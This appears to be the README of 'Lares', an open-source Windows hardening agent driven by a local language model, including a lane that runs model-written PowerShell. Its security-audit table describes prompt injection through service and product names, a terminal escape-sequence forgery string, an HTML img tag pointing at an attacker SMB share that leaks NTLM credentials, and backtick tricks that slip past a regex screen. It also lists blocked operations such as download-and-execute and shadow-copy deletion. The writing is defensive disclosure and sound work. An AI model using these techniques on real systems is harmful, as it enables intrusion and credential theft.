<div align="center">

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="assets/banner-dark.png">
  <img alt="Lares" src="assets/banner.png">
</picture>

**An autonomous Windows hardening agent with a language model running on the machine itself.**

It looks at what the machine is, decides what to do about it, fixes what it can
undo, verifies that the fix worked, and puts back anything that made things
worse. No prompts, no dialogs, no cloud, no account.

[Install](#install) · [Three applications](#three-applications) ·
[How it decides](#how-it-decides) · [The freehand lane](#the-freehand-lane) ·
[Did it stay fixed?](#did-it-stay-fixed) ·
[Why you can leave it running](#why-you-can-leave-it-running) ·
[What it writes down](#what-it-writes-down) · [The model](#the-model) ·
[Security of Lares itself](#security-of-lares-itself) ·
[Will it run here?](#will-it-run-on-my-machine) · [What it will not do](#what-it-will-not-do)

</div>

---

In Roman religion the **Lares** were household guardians: minor gods with no
temples and no mythology to speak of, whose entire remit was the safety of one
house and the people in it. A shrine to them stood by the hearth in ordinary
homes. It seemed the right name for something that lives on one machine, watches
it constantly, and is not interested in anything else.

## The problem this solves

Windows hardening advice exists in enormous quantity and almost nobody applies
it. The CIS benchmark for Windows 11 runs to several hundred pages. The reader
has to work out which items apply to their machine, what each one will break, how
to undo it, and then do the whole thing again in six months. So the firewall
stays off after that one game needed it, WDigest keeps caching passwords in
memory because an installer set it in 2016, and a service runs from
`C:\Tools\Backup Agent\` with no quotes around the path.

Lares does the reading, decides what applies to *this* machine, applies what it
can undo, and keeps a record of every change so any of it can be put back.

## Install

**One file. No Python, no pip, no compiler.**

Download it, run it. The executables are self-contained and the large one has the
language model inside it, so it works on a machine that has never been online.

| Download | What it is | Size |
|---|---|---|
| **`lares-full-x64.exe`** | Terminal application **with the model embedded**. Nothing to fetch, ever. | ~1.1 GB |
| `lares-x64.exe` | Terminal application. Fetches a model the first time it wants one. | ~45 MB |
| `lares-desktop-x64.exe` | Desktop application. | ~90 MB |
| **`lares-freehand-full-x64.exe`** | The no-catalogue lane **with the model embedded**: the model writes every fix. [What that means](#the-freehand-lane). | ~1.1 GB |
| `lares-freehand-x64.exe` | The same, without a model. Refuses to run until it has one. | ~45 MB |
| **`lares-full-arm64.exe`** | Windows on ARM, **with the model embedded**. | ~1.1 GB |
| `lares-arm64.exe` · `lares-desktop-arm64.exe` · `lares-freehand-arm64.exe` | Windows on ARM, without the model. | ~12 / 27 / 12 MB |
| **`lares-freehand-full-arm64.exe`** | The no-catalogue lane for ARM, with the model. | ~1.1 GB |

Get them from the [latest release](https://github.com/at0m-b0mb/Lares-Windows/releases/latest).
Every file is listed in `SHA256SUMS.txt`; check yours before running it.

Or let the installer pick the right one, verify it, and put it on your PATH:

```powershell
irm https://raw.githubusercontent.com/at0m-b0mb/Lares-Windows/main/install.ps1 | iex
```

That is a script from the internet piped into a shell, which is a thing you
should be suspicious of — a security tool asking you to do it without comment
would be a poor advertisement for itself. Read it first:

```powershell
irm https://raw.githubusercontent.com/at0m-b0mb/Lares-Windows/main/install.ps1 -OutFile install.ps1
notepad install.ps1
.\install.ps1 -Full -Desktop -StartWithWindows
```

<details>
<summary>From source instead</summary>

```bash
git clone https://github.com/at0m-b0mb/Lares-Windows
cd Lares-Windows
pip install -r requirements-gui.txt      # or requirements.txt for terminal only
python lares.py doctor
```

macOS and Linux run everything in demo mode against a synthetic machine, which is
how the interface is developed and screenshotted.

</details>

**First run, in this order.** `doctor` says whether this machine can run it,
`scan` changes nothing, `plan` shows you what it *would* do and why. Only then
`run`.

```powershell
lares doctor
lares scan
lares plan
lares run
```

Double-clicking `lares.exe` in Explorer opens a menu instead of flashing a usage
message at you and closing.

## Three applications

Two front doors onto the same engine, and one program that answers the central
question differently. None of them needs the others.

| | |
|---|---|
| **`lares.exe`** | Terminal. Uses colour when `rich` is available and plain text when it is not, because a machine with nothing installed is exactly the machine that most needs hardening. `lares watch` is the agent with no window. |
| **`lares-desktop.exe`** | Desktop. Starts working the moment it opens and keeps working whether you look at it or not. Its **Exposure** page reads the machine the same way the survey below does, and the Hearth shows the model's answer arriving a word at a time. |
| **`lares-freehand.exe`** | No catalogue. It reads the machine, asks the model what is wrong, and runs the PowerShell the model writes back. A different trust model, deliberately a different program — see [The freehand lane](#the-freehand-lane). |

<div align="center">

![The Hearth page](assets/screenshots/01-hearth-light.png)

</div>

## How it decides

**The model chooses from a catalogue. It never writes the code that runs.**

This is the whole design. Every remediation is a hand-written, reviewed entry in
`lares/catalog/controls/*.yaml`, carrying a detection probe, a fix, a rollback,
a risk tier, and a paragraph in plain English explaining why it matters. The
model reads the scan and the retrieved catalogue pages and decides *which*
controls to apply, in what order, with what parameters — and then everything it
said is put through validation before anything runs.

```
sense    run every control's probe, gather machine context
think    retrieve the relevant catalogue pages, ask the model to choose
guard    validate parameters, screen the rendered script, check policy
act      snapshot → apply → verify → health check → keep or undo
record   journal the outcome, including refusals
judge    update the circuit breaker
```

A 1.5B model on a slow CPU will sometimes be wrong. It cannot be wrong in a way
that matters, because the worst it can do is name a control that exists and
supply parameters that get rejected.

### Letting the model lead

`lares run` hands the model a finished scan and asks it to choose. `lares
consult` inverts that: the model is asked what it wants to look at, those
checks are run, and it is asked again — until it says it has seen enough and
gives a verdict.

```powershell
lares consult
lares consult --apply
```

```
round 1: asked for machine facts; the network domain -> 3 problem(s) in 6 check(s)
round 2: asked for IDN-005, SYS-001 -> 2 problem(s) in 2 check(s)
round 3: gave its verdict
```

What it may ask for is bounded, and that is the point rather than a
limitation. Every reading is a detection probe from the catalogue — written by
a person, read-only, with no parameters the model supplies. So it directs the
investigation without being able to invent what the investigation *does*, and
its verdict goes through exactly the same guard as any other plan.

Each round is a full inference pass, so on four cores this is several minutes
of thinking. `--rounds` sets the budget; when it runs out the model is told to
give its verdict on what it has.

There is also `--model-only`, which keeps the ordinary scan but makes the
model the sole decision-maker: its answer is the whole plan, nothing is
appended to it, and if it cannot answer then nothing is changed rather than
the built-in planner quietly deciding instead.

### Watching it think

Every exchange is recorded, but only once it is over — and on four cores a
reply is a minute, a consultation several. For all of that time a spinner is
indistinguishable from a hang.

`--live` replaces it with the conversation itself: what is being sent, then
the answer one token at a time as the model produces it.

```powershell
lares consult --live          # the model leads, and you watch it lead
lares run --model-only --live # the model decides alone, in the open
lares plan --live
lares ask "why is SMB signing off" --live
```

```
sent to the model ----------------------------------------------------------
THE RULES IT IS WORKING UNDER
    You are inspecting one Windows machine. You decide what to look at...
WHAT IT IS BEING TOLD
    Checks available, in domains defence, identity, network, services, system:
      NET-005  [network] LLMNR is enabled
      ...
ITS ANSWER, AS IT IS WRITTEN
    {"ask": {"facts": true, "domains": ["network"]}, "why": "Start with what
     this machine is and what it exposes..."
  Took                   47.3s at 2.6 tokens/s
```

Nothing about the exchange changes — same prompt, same reply, same record
afterwards. It is streamed rather than awaited, which is why you can read it
as it arrives. The system prompt is printed once and not reprinted between
rounds, because five hundred tokens of unchanged rules between every question
buries the part that actually changed.

The desktop application shows the same thing on its **Hearth** page, under
*The model, thinking* — the answer appearing as it is written, with what it
cost underneath. There is no flag for it: the window is already watching.
The card stays hidden until there is something to put in it, because an empty
box labelled "the model is thinking" on a machine with no model reads as
something broken rather than something absent.

### Seeing it work

`lares demo` walks through one full round trip and shows the working at every
step — and the artefacts are real, not illustrations. The prompt shown is the
prompt sent, the reply is the reply received, and the PowerShell is what would
execute, character for character.

```powershell
lares demo
```

```
1. What it reads off the machine          30 controls, 28 findings, and the probe behind one
2. What it asks the model                 the rules, the machine, and whether it fits the window
3. What the model answers                 the raw JSON, verbatim
4. What the guard makes of it             accepted, and refused with reasons
5. The exact PowerShell that would run    the remediation, and its undo
6. Applying it                            probe, snapshot, apply, verify, health, decide
7. What gets written down                 journal, activity log, transcript
```

It changes nothing — stage six is a dry run. With no model installed it uses a
recorded reply from Qwen2.5-Coder 1.5B, kept verbatim **including the control
id it invented**, because a demonstration where the model never errs teaches
the wrong lesson about what stage four is for.

The demo is not a second implementation. It calls `Planner.compose` for the
prompt, `guard.clear_to_run` and `catalogue.render` for the script, and the
real `Executor` to apply it — the same functions `lares run` calls, and the
test suite asserts it keeps doing so. A walkthrough that reimplemented the
pipeline would be worse than none: it could agree today and drift next month,
and you would have no way to tell.

## The freehand lane

> **`lares-freehand.exe` has no catalogue in it.** It reads your machine, asks
> the model what is wrong, and runs the PowerShell the model writes back. It is
> a separate program from `lares.exe` on purpose: the two give different answers
> to the question that matters most about a tool like this — *who wrote the code
> that runs on your machine* — and that is too large a difference to hide behind
> a flag.

```powershell
lares-freehand --recorded     # read the whole lane through, no model needed
lares-freehand --dry-run      # your real machine, real model, no changes
lares-freehand                # let it act on what the model writes
```

### What it does

```
reads     six read-only surveys - installed software and versions, every
          listening TCP and UDP socket and who owns it, running services,
          local accounts, and the settings that decide what is reachable
asks      "here is the machine. what is wrong with it?"
asks      "write the check, the fix and the undo for this one"
screens   refuses a short list of catastrophes
checks    runs the model's own check - already in that state? then nothing
applies   runs the model's fix
verifies  runs the model's check again
decides   keeps it, or runs the model's undo, now
records   journal, transcript, log - so lares journal and lares undo work
```

Everything is printed as it happens: the survey, the exact prompt, the reply
arriving one token at a time, the three scripts, the screen's verdict, every
stage of applying them.

### What the survey reads

| | |
|---|---|
| **software** | every installed product and its version, from all three uninstall keys |
| **ports** | every listening TCP and UDP socket, the owning process, and whether it is bound to every interface or only to localhost |
| **services** | every running service, the account it runs as, and its image path — unquoted paths with spaces are flagged, because that is a local administrator in one step |
| **accounts** | local users, which are enabled, which are administrators |
| **exposure** | RDP and whether it requires NLA, WinRM, SMBv1 and signing, firewall profiles, UAC, automatic logon, LLMNR, Defender, disk encryption |
| **system** | edition, build and patch level, domain membership |

None of it has an opinion. Two fields are derived — *this socket is bound to
0.0.0.0*, *this path has a space and no quotes* — and those are facts about the
reading, no different from the port number. The model is the only thing that
says whether any of it matters.

**The same reading is available without the freehand lane and without a
model.** It is read-only and it decides nothing, so there is no reason to keep
it behind the program that acts on it:

```powershell
lares surface                      # all six readings
lares surface --only ports,software
lares surface --json               # for something else to read
```

In the desktop application it is the **Exposure** page, which reads the machine
off the interface thread so the window stays usable while six PowerShell
collectors run. A count it did not take reads `not read` rather than `0` —
those are the same number and completely different facts.

Every reading is kept, so the interesting question becomes available: not what
is listening, but **what started listening since last time**. See
[Did it stay fixed?](#did-it-stay-fixed).

### What is still not the model's to decide

One thing: a blocklist of operations that will not run whoever wrote them.
Formatting a volume, clearing a disk, deleting shadow copies, editing the boot
configuration, downloading and executing code, `Invoke-Expression`, base64
`-EncodedCommand`, turning the firewall off entirely, deleting accounts,
rebooting without warning.

The check script is screened too, and that is not a formality — it runs before
the fix and it runs even in a dry run, so "it is only a check" is a claim by the
same model that wrote it. The undo is screened on the catastrophic rules only,
for the same reason a catalogue rollback is: putting a setting back can
legitimately mean switching something on again.

### Two things worth saying plainly

**The screen stops catastrophes, not mistakes.** It will refuse a script that
formats `C:`. It will not refuse one that is merely wrong — that sets the wrong
value, or breaks an application nobody told the model about. Nothing can, because
deciding whether arbitrary PowerShell is safe is not a decidable problem, and any
tool claiming otherwise is lying to you on its way to running the script.

**The undo is written by the same model as the fix.** When the model is good,
this lane is genuinely reversible: the change is verified by the model's own
check and put back on the spot if it fails. When the model is wrong about how to
reverse its own change, it is wrong in the same direction. Both scripts are kept
verbatim in the journal so a person can read what ran and what was meant to undo
it. **Take a VM snapshot before letting this one change anything.**

### Getting it

```powershell
# piping into iex cannot take arguments, so download it and run it with them
irm https://raw.githubusercontent.com/at0m-b0mb/Lares-Windows/main/install.ps1 -OutFile install.ps1
.\install.ps1 -Freehand -Full
```

Or download `lares-freehand-full-x64.exe` (or `-arm64`) from [Releases][rel] —
one file, the model inside it, nothing to install. It refuses to run without a
model, because it has nothing to fall back on and will not pretend otherwise.

The binary is built without the catalogue in it. That is a property of the file
rather than a promise about it: the release job fails if a control id can be
found anywhere in its output.

[rel]: https://github.com/at0m-b0mb/Lares-Windows/releases/latest

## Did it stay fixed?

A hardening tool that fixes something once and never looks again is half a
tool. Machines drift. An installer re-enables a protocol. A policy refresh
overwrites a registry value at three in the morning. Somebody turns the
firewall off to make a printer work and forgets.

None of that shows up in a scan, because a scan reports the machine's *state*
and not its *history* — a control fixed in March that came undone in April
reads as "open", indistinguishable from one that was never touched. The
difference matters. Never fixed is work. **Fixed and came undone** is either
something on this machine actively fighting the change, or a change that never
held in the first place, and both are worth knowing before it is applied for
the fourth time.

```powershell
lares drift          # what came undone, and what else moved here
lares drift --fix    # re-apply exactly what came undone, nothing else
```

It answers two questions, because that is how a person asks them.

**Did what Lares did hold?** It reads the journal for every control it left in
place and re-runs that control's own detection probe — the same probe that
found the problem and the same one that verified the fix. Three states, and it
refuses to guess between them: *held*, *came undone*, and *could not be
re-checked*. That third one is a state on purpose. Folding it into either of the
others is how a security tool ends up lying in one direction.

A control that has come undone more than once says so, because that is the
strongest signal available: it did not hold the last three times either.

**What else moved?** Every reading of the attack surface is kept — automatically,
by the agent, at most twice a day — and any two can be compared:

```
ports     TCP/4444 on 0.0.0.0 appeared (nc)
ports     TCP/22 on 0.0.0.0 is gone
accounts  svc-backup: enabled -> enabled, administrator
software  Google Chrome: 109.0.5414.120 -> 120.0.6099.110
exposure  smbv1: disabled -> ENABLED
```

The comparison is deliberately dumb: no severity, no thresholds, no alerting.
A new listening port is a fact; whether it matters is the model's problem, or
yours. Two details are load-bearing anyway. A version change is **one change**,
not a removal and an addition — getting that wrong turns every Patch Tuesday
into forty findings, which is how a change report becomes something nobody
reads. And a view that could not be read is reported as *not compared* rather
than as *nothing changed*, because silence that looks like an all-clear is the
worst answer available.

Neither half needs the model, and neither changes anything without `--fix`.

## Why you can leave it running

You asked for no confirmation dialogs. So the safety is not a prompt — it is that
every change is measured, and undone on the spot if it did not work.

- **Verified, not assumed.** After applying a fix, the same probe that found the
  problem is run again. If the problem is still there, the change is reverted.
- **Health-checked.** Name resolution, the default gateway, an enabled
  administrator account, RDP and WinRM listeners are read before and after. If
  something that was working stops working, the change goes back immediately.
- **Snapshotted.** Registry keys, firewall rules and service configuration are
  exported before the script that touches them runs.
- **Journalled.** Every outcome is appended to a log that carries the fully
  rendered rollback script, so a change can be undone months later without the
  model, the catalogue, or the original finding.
- **Rate-limited.** A budget per cycle, so one bad scan cannot rewrite a machine
  in a single pass.
- **Circuit-broken.** Two consecutive bad cycles and autonomy halts. It keeps
  scanning and reporting, and waits for a person.

A rollback that itself fails is recorded as a failure, not as a rollback — the
change is still on the machine, it says so, and it stays in the undo list.

## What it writes down

Three records, kept apart because they answer three different questions.

| | |
|---|---|
| **Journal** | What was *changed*, and how to undo it. The legal record; never mixed with diagnostics. |
| **Activity log** | What *happened*, in order. Cycles, probes, the breaker. Plain text for reading, JSON lines for machines. |
| **Transcript** | What was *said to the model, what it said back, and what was then done with it*. |

That third one is the one worth having. Anyone can log a prompt and a completion.
In a tool that acts on the answer, what matters is whether the answer was used —
so each exchange records which of the model's choices the guard accepted and
which it refused, and why. An entry showing six proposed actions and five
refusals is the most informative thing this application produces.

Every failure also gets its own report file with the full traceback and a
description of the machine at the time, keyed by a short id that is shown in the
interface. `failed (LR-4F2A91)` is something you can look up.

```powershell
lares logs                        # the running account
lares errors --show LR-4F2A91     # one failure, in full
lares transcript -v               # prompts, replies, and what survived
lares journal                     # what was actually changed
lares undo --last 1               # put it back
```

In the desktop application this is the **Chronicle** page.

<div align="center">

![The Chronicle page](assets/screenshots/04-chronicle-dark.png)

</div>

## The model

**Qwen2.5-Coder**, GGUF at Q4\_K\_M, on the CPU via llama.cpp. No API key, no
network, no telemetry — the model is a file on disk and inference happens in the
process. A security tool that ships a machine's configuration to somebody else's
server to decide what to do about it is not a security tool.

The job is not recalling security trivia; the facts come from the catalogue
through retrieval, which is far more reliable than anything a small model
remembers. The job is reading a scan, choosing controls, filling in parameters,
and emitting strictly-shaped JSON without drifting. That is a code-shaped task,
and Qwen2.5-Coder is the strongest open family at this size.

| Tier | Size | Needs | Speed on a 4-core CPU |
|---|---|---|---|
| 7B | 4.7 GB | 16 GB RAM | 3–6 tokens/s |
| **3B** | 2.0 GB | 8 GB RAM | 6–12 tokens/s — the default |
| 1.5B | 1.1 GB | 4 GB RAM | 10–20 tokens/s — embedded in `lares-full-x64.exe` |
| 0.5B | 0.4 GB | 2 GB RAM | 20–40 tokens/s |

The tier is chosen from measured RAM and physical cores. In the single-file
build, the model is appended to the executable behind a 64-byte footer and
unpacked once into `%LOCALAPPDATA%\Lares\models` with its SHA-256 verified —
so the file is genuinely self-contained but does not re-extract a gigabyte on
every launch.

**There is always a planner.** If no model is installed, is too big for the
machine, or fails to load, the deterministic built-in planner runs instead: it
sorts by severity, prefers the cheapest reversible fix, respects dependencies,
and stops at the budget. The machine still gets hardened. It just does not get
explained as well.

`training/` builds an instruction set from the catalogue and fine-tunes a LoRA
on it, with an evaluation harness that scores a model on whether its plans are
parseable, real, accepted by the guard, faithful to the probe, and complete.

## Will it run on my machine?

Ask it: `lares doctor` reports what is present, what is missing, and what to do
about each.

| | x64 | ARM64 *(incl. VMware Fusion on Apple Silicon)* |
|---|---|---|
| Scanner, catalogue, executor, rollback | yes | yes |
| Terminal application | yes | yes |
| Desktop application | yes | yes — PyQt6 ships ARM64 wheels |
| Embedded language model | yes | yes, compiled with clang |
| Built-in planner | yes | yes |

On **Windows 11 ARM64** everything runs natively, model included.
`llama-cpp-python` publishes no ARM64 wheel, so CI compiles one — and llama.cpp
refuses to build with MSVC on ARM ("use clang"), so the build goes through
clang-cl. That is why `lares-full-arm64.exe` exists. If the compile ever fails,
the slim ARM64 build ships instead and `lares doctor` says which one you have.

Windows on ARM will also happily run x64 Python under emulation, which works and
is slower; `doctor` detects that case with `IsWow64Process2` and reports it
separately rather than mistaking it for a real x64 machine.

**In a VM, take a snapshot before the first run with changes enabled.** It is the
cheapest possible undo and covers the cases the rollback journal cannot, such as
a change that needs a restart to reveal its effect.

## What it will not do

This is about `lares.exe` and `lares-desktop.exe`. `lares-freehand.exe` is a
different program with a different answer to the first item, which is why it is
a different program — see [The freehand lane](#the-freehand-lane).

- Run any script the model wrote. The Expert lane (`lares ask`) has the model
  author PowerShell freely, runs it past a static screen, prints it, and stops.
  Executing it is your decision and your keystroke.
- Apply anything in the **intrusive** tier without a person. Renaming the
  built-in Administrator, disabling RDP, starting BitLocker — a health check
  cannot tell the difference between "the remote operator is fine" and "the
  remote operator is locked out and cannot tell us".
- Format a volume, clear a disk, delete shadow copies, edit the boot
  configuration, disable a network adapter, turn off Defender, delete a user,
  reboot, or pipe a download into `Invoke-Expression`. These are refused by
  pattern before anything runs — in the catalogue, in the Expert lane, and in
  the freehand lane, which is the one thing that lane does not leave to the
  model.
- **Create an account, grant administrator rights, add an antivirus exclusion,
  clear an event log, open an inbound firewall port, or open a network session
  from the machine.** Not catastrophes — these are the specific moves an
  attacker makes, and a program whose job is to shrink a machine's attack
  surface has no legitimate reason to perform any of them. Creating an admin
  and blinding the antivirus are refused even in a rollback.
- Delete a stored credential and claim it can put it back. `IDN-004` clears a
  clear-text autologon password and is marked irreversible, because keeping a
  copy of a password in order to restore it is not something this will do.
- Tell you your machine is secure. The best verdict is *nothing outstanding*,
  which means thirty specific checks passed.

## Security of Lares itself

A tool that runs PowerShell as administrator, unpacks a payload from its own
binary and acts on a language model's output is worth attacking, so it gets
audited like one. What follows is what a pass over the codebase found, stated
plainly rather than summarised away. All of it is fixed, and each has a test
written as the attack rather than as an assertion about the implementation.

| | |
|---|---|
| **Arbitrary file write as administrator** | The embedded model's filename is read from a footer appended to the executable, and it was used to build a path with no validation. `Path("C:/cache") / "C:/Windows/System32/x.dll"` is the System32 path — an absolute component discards everything to its left — so a crafted binary could write its payload anywhere the process could reach. The SHA-256 check was no defence: whoever wrote the name also wrote the hash. Now the name must be a bare filename, checked where it is read and again where it is opened. |
| **Untrusted search path** | `shutil.which` on Windows searches the *current directory first* — CPython inserts `os.curdir` ahead of PATH. If System32 could not be read, Lares would have run whatever `powershell.exe` sat beside the file someone had just double-clicked, as administrator. The Windows path now only accepts absolute candidates under `%SystemRoot%` and Program Files, and reports a missing binary rather than searching. |
| **Prompt injection into the code-writing prompt** | The prompt that *assesses* the machine told the model to treat the reading as data. The prompt that *writes PowerShell* did not — exactly backwards, since assessment mislabels and remediation executes. Service display names and installed product names are strings an attacker chooses; malware names itself. The rule is now in both prompts and the reading is fenced. More importantly, the six refusals above were added, because an instruction to a 1.5B model is not a control. |
| **Terminal output forgery** | A service named `Backup Agent\e[2J\e[H\e[32mEVERYTHING IS FINE` cleared the terminal and printed a reassuring line in green. In a program whose whole output is a security report people act on, letting the subject of the report control the report is the entire problem. All output is stripped of control sequences; a newline in a single-line field is refused too, because that forges a whole line. |
| **The screen was regex over raw PowerShell** | A later audit went through the rule list and defeated thirteen of them without writing anything clever — a backtick before a newline, a backtick inside an identifier (`` I`EX `` runs), a parenthesis where the rule wanted a space, `net.exe` rather than `net`, colon parameter binding, a splat that moves the parameters somewhere a regex cannot read, and `New-NetFirewallRule`, whose own defaults are Inbound and Allow. Rules are now screened against the text with those undone as well as against the original, so each describes an *operation* rather than a spelling. It is still a blocklist; it now closes the cheap half. |
| **A model-written undo got the rollback exemption** | That exemption is earned by provenance — a catalogue rollback is the reviewed inverse of a reviewed remediation. A model reply has none, and the model decides when its undo runs, because a fix whose own check reports NOTFIXED sends the executor straight into it. The whole screen, bypassed by writing a fix that fails. |
| **The journal became elevated PowerShell** | `lares undo` executed a script read back from a file in the user's own profile, which a process running as that user at medium integrity can rewrite — and whoever runs the undo is running as administrator. The rollback is re-rendered from the catalogue and the stored parameters now; the stored text is used only when the control has gone, and then screened in full. |
| **The desktop application rendered machine text as HTML** | `QLabel` defaults to `AutoText`, which guesses "this is HTML" for anything with a tag in it. A product name written under `HKCU` — no UAC prompt needed — reached a label on the Exposure page: the tags were swallowed, so the operator read a clean name and never saw the payload, and Qt resolved `<img src="\\attacker\share\x.png">`, opening an SMB session from an elevated process and handing over an NTLM authentication of the administrator account. Every label is plain text now. |
| **Dead write-then-execute primitive** | An unused function wrote a script to a shared temp directory and returned the path. Nothing called it, and its docstring described a design that never shipped. Deleted rather than kept — a privileged process that writes a script and then runs it by path has a window where another user can replace the file, and leaving that lying around is how the bug gets written later. |

What the same pass found already correct, for what it is worth: every
subprocess is an argument vector with `shell=False`; YAML is `safe_load`; the
model download enforces HTTPS before *and after* redirects, hashes to a `.part`
file and renames atomically; the installer verifies every binary against the
published `SHA256SUMS`; the HTML report escapes every machine-derived value;
state lives in the per-user profile; and a crash report carries version,
platform and architecture but no username, hostname or environment, so it is
safe to paste into an issue.

Two things are worth knowing rather than fixing. The installer puts the
binaries in `%LOCALAPPDATA%\Programs\Lares`, which your own user account can
write to and which you then run as administrator — that is how every per-user
install works, and if you would rather the binary were protected from your own
account, install it under Program Files instead. And the binaries are not
code-signed, so the hash in `SHA256SUMS.txt` is what you have; the integrity
check inside the executable catches corruption, not a determined forger.

Found something? Open an issue. If it is the kind of thing that should not be
public first, say so in the issue without the detail and I will find a way to
take it privately.

## Status, stated plainly

**v0.7.0. The engine is tested. Most of the PowerShell has run once, on one machine.**

The Python — the guard, the executor's state machine, the planner, the catalogue
loader, the logging, the theme — is covered by **702 tests** that run on Windows
and Linux across Python 3.10 and 3.12 in CI. That part works.

The PowerShell is a different matter, and the honest position has three parts:

- **8 of the 30 controls** have applied and verified against a live Windows 11
  ARM64 VM. Those ran, changed the machine, passed their own re-check, and were
  journalled.
- **The other 22 have never executed on real hardware.** They were written
  against Microsoft's documentation, reviewed by hand, and exercised in demo
  mode, which fakes the PowerShell round trip. The shapes are right; a cmdlet
  that behaves differently on 24H2 than the documentation says would not have
  been caught yet.
- **The freehand lane is newer than any of that.** Its engine is tested, and
  what it runs is written fresh by a model each time, so there is nothing to
  pre-verify — which is exactly why it screens, checks, verifies and undoes.
  The embedded 1.5B is the smallest model that can do this job at all, and it
  will sometimes fail to produce a usable answer; the lane says so and changes
  nothing rather than guessing. `lares model --tier 3b --download` is a
  noticeable improvement if you have the memory for it.

Treat this release as ready to try on a machine you can afford to restore. Start
with `lares scan`, read `lares plan`, and use `--dry-run` if you want the whole
cycle with nothing changed. For the freehand lane, `--recorded` reads it through
without a model and `--dry-run` shows you the scripts before any of them run.
Findings from real hardware are the most useful thing anyone could contribute.

## The catalogue

Thirty controls across five domains, each with a probe, a fix, a rollback and a
paragraph of prose. `lares controls` browses them; `lares controls --show NET-003`
prints one in full.

| Domain | Covers |
|---|---|
| `network` | Firewall profiles and default actions, exposed listeners, SMBv1, LLMNR, Remote Registry |
| `identity` | UAC, Guest, clear-text autologon passwords, WDigest, LSA protection, anonymous enumeration |
| `defence` | Defender real-time protection and signatures, tamper protection, ASR rules, SmartScreen, BitLocker, firewall logging |
| `services` | Unquoted service paths, service binaries in writable directories, the Print Spooler, scheduled tasks running as SYSTEM from a writable location |
| `system` | PowerShell v2, script-block logging, command-line auditing, AutoRun, Windows Update |

The catalogue is the trust boundary, so it is validated hard at load: every
control needs a detect probe; anything with a remediation needs a rollback unless
it declares why not; every `{placeholder}` must be a declared parameter and every
declared parameter must be used; string and path parameters must declare a regex,
because an unconstrained one is a command-injection slot; and an unrecognised key
is a loud failure rather than a silently dropped safety property.

## Tests

```bash
python -m pytest tests/ -q
```

702 tests, none of which need Windows. They cover the guard against injection
payloads in every parameter slot, the executor's full state machine including
rollbacks that themselves fail, the planner against the shapes a quantised model
actually produces, state files that survive being interrupted, the model overlay
including corrupted and truncated payloads, the readings of the machine against
the shapes PowerShell returns when it finds nothing, and every text pairing in
both themes
against WCAG AA.

The freehand lane carries its own set, because with no catalogue the things
worth proving are different ones: that a check saying `NOTFIXED` can never be
read as success (`FIXED` is a substring of it, and the wrong test order would
leave changes in place on the strength of the check that said they failed),
that a fix which fails to verify is put back, that a failed undo is recorded as
*still on this machine* rather than as undone, and that the walkthrough goes
through the real agent instead of a second arrangement of it.

## Development notes

```bash
python tools/capture.py          # render every page in both themes
python tools/make_banner.py      # regenerate the banner
python training/build_dataset.py # build the instruction set from the catalogue
python training/evaluate.py      # score a model's planning against the judge
```

The Windows executables are built by CI on `windows-latest` and `windows-11-arm`,
because PyInstaller is a bundler rather than a cross-compiler — a Windows binary
has to be produced on Windows, and an ARM64 one on ARM64.

## Licence

MIT. See [LICENSE](LICENSE).

---

<div align="center">
<sub>Set in Spectral and Inter. The gold is a deep brass that stays readable as
small text, not a bright fill. Dark mode is true black.</sub>
</div>
